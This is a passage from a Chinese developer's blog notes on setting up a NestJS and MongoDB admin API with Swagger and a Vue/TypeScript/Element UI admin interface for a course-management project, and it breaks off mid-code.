    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><a id="more"></a><h1 id="Mimikyu-开发笔记"><a href="#Mimikyu-开发笔记" class="headerlink" title="Mimikyu 开发笔记"></a>Mimikyu 开发笔记</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="github"><a href="#github" class="headerlink" title="github"></a>github</h3><ul><li>新建仓库：README,.gitignore:Node,LICENSE:MIT</li><li>git clone <a href="mailto:git@github.com" rel="external nofollow noopener noreferrer" target="_blank">git@github.com</a>:xx/xx</li></ul><h3 id="nest-admin-后台管理接口部分实现"><a href="#nest-admin-后台管理接口部分实现" class="headerlink" title="nest-admin 后台管理接口部分实现"></a>nest-admin 后台管理接口部分实现</h3><ul><li>参考网址：<a href="https://docs.nestjs.com/first-steps" rel="external nofollow noopener noreferrer" target="_blank">https://docs.nestjs.com/first-steps</a></li><li>全局安装 nest：<code>yarn global add @nestjs/cli</code></li><li>创建新 nest 项目：<code>nest new 项目名</code> For example：<code>nest new server</code></li><li>推荐选择 yarn 安装项目依赖</li><li>进入 server 项目：<code>cd server</code>,创建子应用,用于管理后台接口：<code>nest g app 应用名</code> For example：<code>nest g app admin</code></li><li>启动子应用 admin 服务：<code>nest start -w admin</code></li><li>创建 lib 库，用于数据库相关公用库：<code>nest g lib db</code>,(default:@app)推荐输入使用<code>@libs</code></li><li>在 <code>server\apps\admin\src\app.module.ts</code> 在引入 <code>DbModule</code></li><li>需要连接数据库，安装所需依赖：<code>yarn add nestjs-typegoose @typegoose/typegoose mongoose @types/mongoose</code></li><li>在<code>server\libs\db\src\db.module.ts</code>中使用<code>TypegooseModule.forRoot</code>链接数据库</li></ul><blockquote><p>server\libs\db\src\db.module.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 连接数据库</span></span><br><span class="line">imports: [</span><br><span class="line">  TypegooseModule.forRoot(<span class="string">'mongodb://localhost/mimikyu'</span>, &#123;</span><br><span class="line">    useNewUrlParser: <span class="literal">true</span>,</span><br><span class="line">    useUnifiedTopology: <span class="literal">true</span>,</span><br><span class="line">    useCreateIndex: <span class="literal">true</span>,</span><br><span class="line">    useFindAndModify: <span class="literal">false</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">],</span><br></pre></td></tr></table></figure><blockquote><p>附：下载安装配置Mongodb：<a href="https://www.cnblogs.com/wuweixiong/p/12592172.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.cnblogs.com/wuweixiong/p/12592172.html</a></p></blockquote><p><a href="http://downloads.mongodb.org/win32/mongodb-win32-x86_64-2008plus-ssl-3.6.17-signed.msi" rel="external nofollow noopener noreferrer" target="_blank">http://downloads.mongodb.org/win32/mongodb-win32-x86_64-2008plus-ssl-3.6.17-signed.msi</a></p><ul><li>新建 models 文件夹存放所有数据库模型：<code>server\libs\db\src\models</code></li><li>新建<code>server\libs\db\src\models\user.mdel.ts</code>存放用户数据库模型</li></ul><blockquote><p>server\libs\db\src\models\user.mdel.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; prop &#125; <span class="keyword">from</span> <span class="string">"@typegoose/typegoose"</span>; <span class="comment">// 使用prop装饰数据库模型属性</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> User &#123;</span><br><span class="line">  <span class="meta">@prop</span>()</span><br><span class="line">  username: <span class="built_in">string</span>; <span class="comment">// 属性</span></span><br><span class="line">  <span class="meta">@prop</span>()</span><br><span class="line">  password: <span class="built_in">string</span>; <span class="comment">// 属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以通过在<code>server\libs\db\src\db.module.ts</code>在使用<code>@Global()</code>将其标志为全局，并将 <code>server\libs\db\src\db.module.ts</code>导入，以通过全局使用</li><li>在 admin 层级下创建 users 子模块，去管理 user 模型：<code>nest g mo -p admin users</code></li><li>在 admin 层级下创建 users 控制器：<code>nest g co -p admin users</code></li><li>为方便使用数据库的增删改查，安装依赖：<code>yarn add nestjs-mongoose-crud</code></li><li>在<code>server\apps\admin\src\users\users.controller.ts</code>中使用<code>@InjectModel(User) private readonly model</code>输入模型，引入 User 模型</li><li>使用 Crud 为对应模型快捷建立增删改查</li></ul><blockquote><p>server\apps\admin\src\users\users.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Crud</span>(&#123;</span><br><span class="line">    model: User</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>安装接口文档依赖：<code>yarn add @nestjs/swagger swagger-ui-express</code></li><li>可以尝试 GET 请求<code>http://localhost:3000/users</code>测试是否正常</li><li>参考：<code>https://docs.nestjs.com/recipes/swagger</code>在<code>server\apps\admin\src\main.ts</code>中使用 swagger</li></ul><blockquote><p>server\apps\admin\src\main.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Module, Global &#125; <span class="keyword">from</span> <span class="string">"@nestjs/common"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; DbService &#125; <span class="keyword">from</span> <span class="string">"./db.service"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; TypegooseModule &#125; <span class="keyword">from</span> <span class="string">"nestjs-typegoose"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">"./models/user.mdel"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> models = TypegooseModule.forFeature([User]);</span><br><span class="line"></span><br><span class="line"><span class="meta">@Global</span>() <span class="comment">// 使用Global将当前文件标志为全局使用</span></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="comment">// 连接数据库</span></span><br><span class="line">  imports: [</span><br><span class="line">    TypegooseModule.forRoot(<span class="string">"mongodb://localhost/mimikyu"</span>, &#123;</span><br><span class="line">      useNewUrlParser: <span class="literal">true</span>,</span><br><span class="line">      useUnifiedTopology: <span class="literal">true</span>,</span><br><span class="line">      useCreateIndex: <span class="literal">true</span>,</span><br><span class="line">      useFindAndModify: <span class="literal">false</span></span><br><span class="line">    &#125;),</span><br><span class="line">    models <span class="comment">// 导入模型</span></span><br><span class="line">  ],</span><br><span class="line">  providers: [DbService],</span><br><span class="line">  exports: [DbService, models] <span class="comment">// 导出模型</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> DbModule &#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>可以使用 <code>@ApiUseTags</code> 为<code>server\apps\admin\src\users\users.controller.ts</code>的控制器添加标签</li></ul><blockquote><p>server\apps\admin\src\users\users.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiUseTags</span>(<span class="string">'用户'</span>) <span class="comment">// 标签，用于Swagger</span></span><br></pre></td></tr></table></figure><ul><li>可以使用<code>@ApiModelProperty</code>为<code>server\libs\db\src\models\user.mdel.ts</code>添加描述</li></ul><blockquote><p>server\libs\db\src\models\user.mdel.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiModelProperty</span>(&#123; description: <span class="string">'用户名'</span>, example: <span class="string">'testName'</span> &#125;) <span class="comment">// 添加描述，作用于swagger文档</span></span><br></pre></td></tr></table></figure><ul><li>可以在模型中使用<code>@modelOptions</code>为模型中的各个属性都添加指定的额外属性</li></ul><blockquote><p>server\libs\db\src\models\user.mdel.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@modelOptions</span>(&#123;</span><br><span class="line">  schemaOptions:&#123;</span><br><span class="line">    timestamps:<span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>由于课程中可以包含多个课时，所有可以新建课程模型(<code>server\libs\db\src\models\course.model.ts</code>)及课时模型(<code>server\libs\db\src\models\episodes.model.ts</code>),将课时模型引入并内嵌到课程模型中，作为其下的一个属性。</li></ul><blockquote><p>server\libs\db\src\models\course.model.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiModelProperty</span>(&#123; description: <span class="string">'课程'</span> &#125;) <span class="comment">// 添加描述，作用于swagger文档</span></span><br><span class="line"><span class="meta">@arrayProp</span>(&#123; itemsRef: <span class="string">'Episode'</span> &#125;) <span class="comment">// 使用arrayProp表示该属性为数组字段,通过itemsRef可以指定属性的参考模型</span></span><br><span class="line">episodes: Ref&lt;Episode&gt;[]; <span class="comment">// Ref表示参考类型，定义为泛型,此处引入Episode模型，将其（课时）内嵌在课程中</span></span><br></pre></td></tr></table></figure><ul><li>类似创建 users 子模块的方法，使用<code>nest g mo -p admin courses</code>创建 courses 子模块，用于管理 course 模型</li><li>同样地，使用<code>nest g co -p admin courses</code>创建 courses 子模块的控制器</li><li>同样地，在<code>server\apps\admin\src\courses\courses.controller.ts</code>中添加<code>@Crud</code>，快捷添加增删改查</li></ul><blockquote><p>server\apps\admin\src\courses\courses.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Crud</span>(&#123;</span><br><span class="line">    model: Course</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>在<code>server\apps\admin\src\courses\courses.controller.ts</code>控制器中注入 Course 模型</li></ul><blockquote><p>server\apps\admin\src\courses\courses.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@InjectModel</span>(Course) <span class="keyword">private</span> readonly model: ReturnModelType&lt;<span class="keyword">typeof</span> Course&gt;,</span><br><span class="line">) &#123;&#125; <span class="comment">// 使用@InjectModel注入模型，最后也可以使用ReturnModelType&lt;typeof Course&gt;定义改模型类型</span></span><br></pre></td></tr></table></figure><ul><li>可以为该控制器添加<code>@ApiUseTags(&#39;课程&#39;)</code>作为其 swagger 的分类</li><li>同样地，需要在<code>server\libs\db\src\db.module.ts</code>引入上面创建的 Course 及 Episode 模型才能正常使用</li></ul><blockquote><p>server\libs\db\src\db.module.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> models = TypegooseModule.forFeature([User, Course, Episode]); <span class="comment">// 引入模型</span></span><br></pre></td></tr></table></figure><ul><li>和创建课程子模块一样，使用<code>nest g mo -p admin episodes</code>创建课时模块</li><li>和创建课程控制器一样，使用<code>nest g co -p admin episodes</code>创建课时控制器</li><li>同样地，添加<code>@Crud({model: Episode})</code>为 Episode 模型快捷添加增删改查操作</li><li>同样地，通过注入的方式，引入 Episode 模型</li></ul><blockquote><p>server\apps\admin\src\episodes\episodes.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="meta">@InjectModel</span>(Episode) <span class="keyword">private</span> readonly model:ReturnModelType&lt;<span class="keyword">typeof</span> Episode&gt;</span></span><br><span class="line"><span class="params"></span>)&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>最后，可以使用<code>@ApiUseTags(&#39;课时&#39;)</code>为该控制器添加 swagger 标签</li></ul><h3 id="vue-admin-后台管理界面部分实现"><a href="#vue-admin-后台管理界面部分实现" class="headerlink" title="vue-admin 后台管理界面部分实现"></a>vue-admin 后台管理界面部分实现</h3><blockquote><p>温馨提示：遇事不决，重启为上。新建了 xx.d.ts，还是提示找不到模块？重启项目吧。console.log()报错？试试 global.console.log()</p></blockquote><ul><li><code>vue create admin</code> 使用默认方式创建即可</li><li><code>cd admin</code></li><li>使用 ts 的方式编写项目：<code>vue add typescript</code></li><li>添加 element：<code>vue add element</code> 若<code>Still proced? y</code> <code>Fully import</code> <code>SCSS variables? No</code> <code>zh-CN</code></li><li><code>vue add router</code>,<code>Use history ... ? n</code></li><li><code>vue add typescript</code>,<code>Use class-style ...syntax? Yes</code> <code>Use Babel ...JSX)? Yes</code> <code>Convert all .js ...ts? Yes</code> <code>Allow ...compiled? No</code></li><li>注意修改<code>admin\src\main.ts</code>中的引入 element 为引入 ts 而不是 ts,<code>import &#39;./plugins/element&#39;</code>即可</li><li>适当修改<code>admin\src\App.vue</code></li></ul><blockquote><p>admin\src\App.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Component, Vue &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line">  @Component(&#123;&#125;)</span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  body &#123;</span><br><span class="line">    padding: 0;</span><br><span class="line">    margin: 0;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>创建主要布局容器<code>admin\src\views\Main.vue</code>,可以通过在 vscode 中安装<code>Element UI Snippets</code>插件，输入<code>elcon</code>即可扩展为 element 的默认布局，输入<code>elmen</code>则可扩展出 element 的菜单。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue add element</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\views\Main.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-container</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-aside</span> <span class="attr">width</span>=<span class="string">"200px"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 此处可以使用elmen扩展出element菜单 --&gt;</span></span><br><span class="line">      菜单</span><br><span class="line">      <span class="comment">&lt;!-- Aside content --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-aside</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-container</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-header</span> <span class="attr">height</span>&gt;</span></span><br><span class="line">        Mimkyue - 后台管理界面</span><br><span class="line">        <span class="comment">&lt;!-- Header content --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-header</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-main</span> <span class="attr">height</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Main content --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-main</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-container</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-container</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">// 上面使用lang="ts"标记为ts语法</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Vue, Component &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">  @Component(&#123;&#125;) <span class="comment">// 使用@Component标注其为组件</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>在<code>admin\src\views\Main.vue</code>中使用<code>router-view</code>后，需要到<code>admin\src\router\index.ts</code>中加上且作为其他路由的父级</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue add router</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\router\index.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> VueRouter, &#123; RouteConfig &#125; <span class="keyword">from</span> <span class="string">"vue-router"</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes: RouteConfig[] = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">"/"</span>,</span><br><span class="line">    component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/Main.vue"</span>), <span class="comment">// 懒加载，加快页面加载速度</span></span><br><span class="line">    children: [</span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">"/"</span>,</span><br><span class="line">        name: <span class="string">"home"</span>,</span><br><span class="line">        component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/Home.vue"</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure><ul><li>适当改造<code>admin\src\views\Main.vue</code></li></ul><blockquote><p>admin\src\views\Main.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-container</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-aside</span> <span class="attr">width</span>=<span class="string">"200px"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-menu</span></span></span><br><span class="line"><span class="tag">        <span class="attr">mode</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">style</span>=<span class="string">"height:100vh"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:default-active</span>=<span class="string">"$router.path"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">router</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-submenu</span></span></span><br><span class="line"><span class="tag">          <span class="attr">v-for</span>=<span class="string">"(item, index) in menu.items"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">:index</span>=<span class="string">"`menu-item-$&#123;index&#125;`"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">:key</span>=<span class="string">"`menu-item-$&#123;index&#125;`"</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">template</span> <span class="attr">slot</span>=<span class="string">"title"</span>&gt;</span>&#123;&#123; item.title &#125;&#125;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-menu-item</span></span></span><br><span class="line"><span class="tag">            <span class="attr">v-for</span>=<span class="string">"(subItem, subIndex) in item.items"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">:key</span>=<span class="string">"`menu-item-$&#123;index&#125;-$&#123;subIndex&#125;`"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">:index</span>=<span class="string">"subItem.path"</span></span></span><br><span class="line"><span class="tag">            &gt;</span>&#123;&#123; subItem.title &#125;&#125;<span class="tag">&lt;/<span class="name">el-menu-item</span></span></span><br><span class="line"><span class="tag">          &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-submenu</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-menu</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- Aside content --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-aside</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-container</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-header</span> <span class="attr">height</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Mimkyue - 后台管理界面<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Header content --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-header</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-main</span> <span class="attr">height</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Main content --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-main</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-container</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-container</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">// 使用ts</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Vue, Component &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">  @Component(&#123;&#125;) <span class="comment">// 使用@Component标注其为组件</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;</span></span><br><span class="line">    menu = &#123;</span><br><span class="line">      items: [</span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">          title: <span class="string">"内容管理"</span>,</span></span><br><span class="line">          items: [</span><br><span class="line">            &#123;</span><br><span class="line"><span class="actionscript">              title: <span class="string">"首页"</span>,</span></span><br><span class="line"><span class="actionscript">              path: <span class="string">"/"</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line"><span class="actionscript">              title: <span class="string">"课程管理"</span>,</span></span><br><span class="line"><span class="actionscript">              path: <span class="string">"/courses/list"</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line"><span class="actionscript">              title: <span class="string">"课时管理"</span>,</span></span><br><span class="line"><span class="actionscript">              path: <span class="string">"/courses/create"</span></span></span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">          title: <span class="string">"运营管理"</span>,</span></span><br><span class="line">          items: [</span><br><span class="line">            &#123;</span><br><span class="line"><span class="actionscript">              title: <span class="string">"用户管理"</span>,</span></span><br><span class="line"><span class="actionscript">              path: <span class="string">"/users/list"</span></span></span><br><span class="line">            &#125;</span><br><span class="line">          